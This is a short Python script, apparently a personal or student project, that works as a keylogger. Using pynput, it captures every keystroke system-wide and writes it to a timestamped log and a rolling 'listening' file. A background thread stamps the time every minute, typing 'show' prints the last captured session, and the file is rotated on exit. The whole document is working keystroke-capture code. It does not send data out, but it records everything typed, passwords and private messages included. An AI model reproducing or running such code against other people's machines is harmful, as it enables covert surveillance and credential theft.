import os
import threading
from pynput.keyboard import Listener, Key
from datetime import datetime
import time

now = datetime.now().strftime("%d-%m-%Y-%H.%M.%S")
filename = ('keys_' + now + '.txt')
Last_listen_filename = 'Last_listen.txt'
Current_listening_name = 'listening.txt'
Current_listening = []

def timestemp_everyminute():
   while True:
      timestemp = datetime.now().strftime("%d/%m/%Y-%H:%M:%S")
      with open(filename, "a", encoding='utf-8') as file:
         file.write(f'\n~{timestemp}:~\n')
      time.sleep(60)
        
def on_press(key):
    try:
        text_key = (key.char)
    except:
        text_key = (f' [{key}]')
    with open(filename, "a", encoding='utf-8') as file:
        Current_listening.append(text_key)
        file.write(text_key)
        file.flush()
    with open(Current_listening_name, "a", encoding='utf-8') as showfile:
        showfile.write(text_key)
        showfile.flush()
    if key == Key.esc:#רק לשימוש נוח, לא רלוונטי לפרוייקט
        return  False#רק לשימוש נוח, לא רלוונטי לפרוייקט
    if ''.join(Current_listening[-4:]) == ('show'):
        if os.path.exists(Last_listen_filename):
            with open(Last_listen_filename, "r", encoding='utf-8') as showlestfile:
                print(showlestfile.read())
        else:
            with open(Current_listening_name, "r", encoding='utf-8') as showfile:
                print(showfile.read())
            
Thread_timestemp_everyminute = threading.Thread(target=timestemp_everyminute, daemon=True)
Thread_timestemp_everyminute.start()

with Listener(on_press=on_press) as listener:
    listener.join()
    
if os.path.exists(Last_listen_filename):
    os.remove(Last_listen_filename)
    
os.rename(Current_listening_name, Last_listen_filename)
